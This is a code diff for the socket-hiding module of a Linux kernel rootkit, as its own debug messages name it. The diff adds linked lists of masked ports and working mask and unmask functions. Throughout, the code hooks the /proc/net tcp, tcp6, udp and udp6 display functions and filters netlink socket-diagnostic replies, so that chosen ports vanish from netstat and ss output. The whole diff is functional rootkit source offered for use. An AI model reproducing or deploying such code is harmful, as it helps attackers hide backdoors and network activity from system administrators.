@@ -39,19 +39,21 @@
 #define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
 #define PRINT_SOCKET(protocol, port) printk(KERN_INFO "rootkit process_masking: masking socket (%s, %d)\n", (protocol), (port))
 #define DEBUG_PRINT_SOCKET(protocol, port) if (show_debug_messages) PRINT_SOCKET(protocol, port)
-#define PORTS_BUFFSIZE 8   //TODO: to be deleted
+
+
+/* Definition of data structs */
+struct masked_socket {   /* List to keep hidden sockets */
+	struct list_head list;
+	int port;
+};
 
 
 /* Definition of global variables */
 static int show_debug_messages;
-static int tcp4_ports[PORTS_BUFFSIZE];   //TODO: to be deleted
-static int tcp4_ports_count;   //TODO: to be deleted
-static int tcp6_ports[PORTS_BUFFSIZE];   //TODO: to be deleted
-static int tcp6_ports_count;   //TODO: to be deleted
-static int udp4_ports[PORTS_BUFFSIZE];   //TODO: to be deleted
-static int udp4_ports_count;   //TODO: to be deleted
-static int udp6_ports[PORTS_BUFFSIZE];   //TODO: to be deleted
-static int udp6_ports_count;   //TODO: to be deleted
+static struct list_head masked_tcp4_sockets;
+static struct list_head masked_tcp6_sockets;
+static struct list_head masked_udp4_sockets;
+static struct list_head masked_udp6_sockets;
 asmlinkage ssize_t (*sm_original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);   //TODO: should point to original_recvmsg
 asmlinkage int (*original_tcp4_show) (struct seq_file *, void *);
 asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
@@ -68,6 +70,8 @@ asmlinkage ssize_t socket_masking_recvmsg_syscall(int, struct user_msghdr __user
 int mask_socket(char *protocol, int port);
 int unmask_socket(char *protocol, int port);
 
+static void delete_masked_sockets(void);
+
 static void netstat_masking_init(void);
 static void netstat_masking_exit(void);
 
@@ -80,10 +84,11 @@ static int my_tcp6_show(struct seq_file *, void *);
 static int my_udp4_show(struct seq_file *, void *);
 static int my_udp6_show(struct seq_file *, void *);
 
-static int should_mask_socket(char *, int);
+static int socket_is_masked(char *, int);
+static struct list_head *get_sockets_list_ptr(char *);
 
 
-/* Definition of structs */
+/* Definition of data structs */
 /*****************************************************************************/
 /*                                                                           */
 /*    DEFINITION BELOW IS TAKEN FROM fs/proc/internal.h, lines 21-52         */
@@ -136,6 +141,11 @@ int socket_masking_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
+	INIT_LIST_HEAD(&masked_tcp4_sockets);
+	INIT_LIST_HEAD(&masked_tcp6_sockets);
+	INIT_LIST_HEAD(&masked_udp4_sockets);
+	INIT_LIST_HEAD(&masked_udp6_sockets);
+
 	netstat_masking_init();
 
 	DEBUG_PRINT("initialized");
@@ -146,6 +156,8 @@ int socket_masking_init(int debug_mode_on)
 
 int socket_masking_exit(void)
 {
+	delete_masked_sockets();
+
 	netstat_masking_exit();
 
 	DEBUG_PRINT("exited");
@@ -227,10 +239,20 @@ asmlinkage ssize_t socket_masking_recvmsg_syscall(int sockfd, struct user_msghdr
 
 int mask_socket(char *protocol, int port)
 {
-	if (is_invalid_protocol(protocol) || is_invalid_port(port))
-		return 1;
+	struct masked_socket *new;
 
-	//TODO: to be implemented
+	if (is_invalid_protocol(protocol) || is_invalid_port(port))
+		return -1;
+
+	if (socket_is_masked(protocol, port))
+		return -1;
+
+	if ((new = kmalloc(sizeof(struct masked_socket), GFP_KERNEL)) == NULL)
+		return -ENOMEM;
+
+	new->port = port;
+
+	list_add(&new->list, get_sockets_list_ptr(protocol));
 
 	return 0;
 }
@@ -238,9 +260,58 @@ int mask_socket(char *protocol, int port)
 
 int unmask_socket(char *protocol, int port)
 {
-	//TODO: to be implemented
+	struct masked_socket *cur;
+	struct list_head *cursor, *next;
 
-	return 0;
+	if (is_invalid_protocol(protocol) || is_invalid_port(port))
+		return -1;
+
+	list_for_each_safe(cursor, next, get_sockets_list_ptr(protocol)) {
+		cur = list_entry(cursor, struct masked_socket, list);
+		if (cur->port == port) {
+			list_del(cursor);
+			kfree(cur);
+
+			return 0;
+		}
+	}
+
+	return -EINVAL;
+}
+
+
+static void delete_masked_sockets(void)
+{
+	struct list_head *cursor, *next;
+	struct masked_socket *masked_socket_ptr;
+
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &masked_tcp4_sockets) {
+		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
+		list_del(cursor);
+		kfree(masked_socket_ptr);
+	}
+
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &masked_tcp6_sockets) {
+		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
+		list_del(cursor);
+		kfree(masked_socket_ptr);
+	}
+
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &masked_udp4_sockets) {
+		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
+		list_del(cursor);
+		kfree(masked_socket_ptr);
+	}
+
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &masked_udp6_sockets) {
+		masked_socket_ptr = list_entry(cursor, struct masked_socket, list);
+		list_del(cursor);
+		kfree(masked_socket_ptr);
+	}
 }
 
 
@@ -274,25 +345,25 @@ static void netstat_masking_init(void)
 		//PRINT(proc_dir_entryptr->name);
 
 		/* Search for the entries called tcp, tcp6, udp and udp6 */
-		if (!strcmp(proc_dir_entryptr->name, "tcp") && tcp4_ports_count) {
+		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
 			tcp_seq = proc_dir_entryptr->data;
 			original_tcp4_show = tcp_seq->seq_ops.show;
 
 			/* Hook the kernel function tcp4_seq_show */
 			tcp_seq->seq_ops.show = my_tcp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "tcp6") && tcp6_ports_count) {
+		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
 			tcp_seq = proc_dir_entryptr->data;
 			original_tcp6_show = tcp_seq->seq_ops.show;
 
 			/* Hook the kernel function tcp6_seq_show */
 			tcp_seq->seq_ops.show = my_tcp6_show;
-		} else if  (!strcmp(proc_dir_entryptr->name, "udp") && udp4_ports_count) {
+		} else if  (!strcmp(proc_dir_entryptr->name, "udp")) {
 			udp_seq = proc_dir_entryptr->data;
 			original_udp4_show = udp_seq->seq_ops.show;
 
 			/* Hook the kernel function udp4_seq_show */
 			udp_seq->seq_ops.show = my_udp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "udp6") && udp6_ports_count) {
+		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
 			udp_seq = proc_dir_entryptr->data;
 			original_udp6_show = udp_seq->seq_ops.show;
 
@@ -324,16 +395,16 @@ static void netstat_masking_exit(void)
 
 		//PRINT(proc_dir_entryptr->name);
 
-		if (!strcmp(proc_dir_entryptr->name, "tcp") && tcp4_ports_count) {
+		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
 			tcp_seq = proc_dir_entryptr->data;
 			tcp_seq->seq_ops.show = original_tcp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "tcp6") && tcp6_ports_count) {
+		} else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
 			tcp_seq = proc_dir_entryptr->data;
 			tcp_seq->seq_ops.show = original_tcp6_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "udp") && udp4_ports_count) {
+		} else if (!strcmp(proc_dir_entryptr->name, "udp")) {
 			udp_seq = proc_dir_entryptr->data;
 			udp_seq->seq_ops.show = original_udp4_show;
-		} else if (!strcmp(proc_dir_entryptr->name, "udp6") && udp6_ports_count) {
+		} else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
 			udp_seq = proc_dir_entryptr->data;
 			udp_seq->seq_ops.show = original_udp6_show;
 		}
@@ -356,10 +427,10 @@ static int data_should_be_masked(struct nlmsghdr *nlh)
 	/* From the ancilliary data extract the port associated with the socket identity */
 	port = ntohs(r->id.idiag_sport);
 
-	if ((tcp4_ports_count && should_mask_socket("tcp4", port)) ||
-			(tcp6_ports_count && should_mask_socket("tcp6", port)) ||
-			(udp4_ports_count && should_mask_socket("udp4", port)) ||
-			(udp6_ports_count && should_mask_socket("udp6", port)))
+	if (socket_is_masked("tcp4", port) ||
+			socket_is_masked("tcp6", port) ||
+			socket_is_masked("udp4", port) ||
+			socket_is_masked("udp6", port))
 		return 1;
 
 	return 0;
@@ -402,7 +473,7 @@ static int my_tcp4_show(struct seq_file *m, void *v)
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (should_mask_socket("tcp4", port))
+	if (socket_is_masked("tcp4", port))
 		return 0;
 
 	return original_tcp4_show(m, v);
@@ -420,7 +491,7 @@ static int my_tcp6_show(struct seq_file *m, void *v)
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (should_mask_socket("tcp6", port))
+	if (socket_is_masked("tcp6", port))
 		return 0;
 
 	return original_tcp6_show(m, v);
@@ -438,7 +509,7 @@ static int my_udp4_show(struct seq_file *m, void *v)
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (should_mask_socket("udp4", port))
+	if (socket_is_masked("udp4", port))
 		return 0;
 
 	return original_udp4_show(m, v);
@@ -456,7 +527,7 @@ static int my_udp6_show(struct seq_file *m, void *v)
 	inet = inet_sk((struct sock *) v);
 	port = ntohs(inet->inet_sport);
 
-	if (should_mask_socket("udp6", port))
+	if (socket_is_masked("udp6", port))
 		return 0;
 
 	return original_udp6_show(m, v);
@@ -464,30 +535,33 @@ static int my_udp6_show(struct seq_file *m, void *v)
 
 
 /* Function that checks whether we need to mask the specified socket */
-static int should_mask_socket(char *protocol, int port)
+static int socket_is_masked(char *protocol, int port)
 {
-	int ports_count = 0;
-	int *ports = NULL;
-	int i;
+	struct masked_socket *cur;
+	struct list_head *cursor;
 
-	if (!strcmp(protocol, "tcp4")) {
-		ports_count = tcp4_ports_count;
-		ports = tcp4_ports;
-	} else if (!strcmp(protocol, "tcp6")) {
-		ports_count = tcp6_ports_count;
-		ports = tcp6_ports;
-	} else if (!strcmp(protocol, "udp4")) {
-		ports_count = udp4_ports_count;
-		ports = udp4_ports;
-	} else if (!strcmp(protocol, "udp6")) {
-		ports_count = udp6_ports_count;
-		ports = udp6_ports;
+	list_for_each(cursor, get_sockets_list_ptr(protocol)) {
+		cur = list_entry(cursor, struct masked_socket, list);
+		if (cur->port == port)
+			return 1;
 	}
 
-	for (i=0 ; i<ports_count ; i++)
-		if (ports[i] == port)
-			return 1;
-
 	return 0;
+}
+
+
+/* Function that checks whether we need to mask the specified socket */
+static struct list_head *get_sockets_list_ptr(char *protocol)
+{
+	if (!strcmp(protocol, "tcp4"))
+		return &masked_tcp4_sockets;
+	else if (!strcmp(protocol, "tcp6"))
+		return &masked_tcp6_sockets;
+	else if (!strcmp(protocol, "udp4"))
+		return &masked_udp4_sockets;
+	else if (!strcmp(protocol, "udp6"))
+		return &masked_udp6_sockets;
+
+	return NULL;
 }
 
